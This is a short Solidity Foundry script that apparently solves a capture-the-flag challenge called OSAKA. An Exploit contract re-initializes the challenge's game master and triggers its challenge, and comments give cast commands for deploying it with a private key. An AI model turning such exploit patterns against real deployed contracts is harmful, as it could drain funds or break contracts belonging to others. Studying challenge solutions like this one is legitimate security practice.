// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import {OSAKA} from "../src/OSAKA.sol";

// forge create script/OSAKA.s.sol:Exploit --private-key $PRIVATE_KEY
// cast run (cast send $EXPLOIT_ADDR "exploit(address)" $INSTANCE_ADDR --private-key $PRIVATE_KEY --gas-limit 4632905 --json | jq .transactionHash -r)

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        OSAKA osaka = OSAKA(vm.envAddress("INSTANCE_ADDR"));
        Exploit exploit = new Exploit();
        exploit.exploit(osaka);
        require(osaka.isSolved());
        vm.stopBroadcast();
    }
}

contract Exploit {
    function exploit(OSAKA osaka) public {
        osaka.isSolved(); // for access set
        osaka.gameMaster().initializeGame(1, 1);
        osaka.challenge();
    }

    function solve(uint256 sticks) public pure returns (uint256) {
        return sticks;
    }
}
